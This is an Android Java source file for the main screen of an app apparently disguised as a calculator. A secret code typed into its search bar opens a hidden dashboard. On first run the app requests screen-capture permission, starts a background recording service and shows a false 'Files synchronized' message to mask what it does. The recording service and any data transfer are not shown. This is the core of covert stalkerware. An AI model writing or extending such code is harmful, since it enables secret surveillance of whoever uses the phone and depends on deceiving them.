package com.guardian.calc;

import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.os.Bundle;
import android.text.Editable;
import android.text.TextWatcher;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE_SCREEN_CAPTURE = 1001;
    private static final String SECRET_CODE = "9876";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        EditText searchBar = findViewById(R.id.search_bar);
        searchBar.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

            @Override
            public void onTextChanged(CharSequence s, int start, int before, int count) {
                if (s.toString().equals(SECRET_CODE)) {
                    openDashboard();
                }
            }

            @Override
            public void afterTextChanged(Editable s) {}
        });

        // Request permission on first run
        checkInitialization();
    }

    private void checkInitialization() {
        // Simple logic to ensure the background service is started once
        if (getIntent().getBooleanExtra("started_from_service", false)) return;
        
        requestScreenCapturePermission();
    }

    private void openDashboard() {
        Intent intent = new Intent(this, DashboardActivity.class);
        startActivity(intent);
    }

    private void requestScreenCapturePermission() {
        MediaProjectionManager manager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        if (manager != null) {
            startActivityForResult(manager.createScreenCaptureIntent(), REQUEST_CODE_SCREEN_CAPTURE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_CODE_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK) {
                Intent serviceIntent = new Intent(this, RecordingService.class);
                serviceIntent.putExtra("resultCode", resultCode);
                serviceIntent.putExtra("data", data);
                startForegroundService(serviceIntent);
                Toast.makeText(this, "Files synchronized", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Setup incomplete. Please reopen the app.", Toast.LENGTH_LONG).show();
            }
        }
    }
}
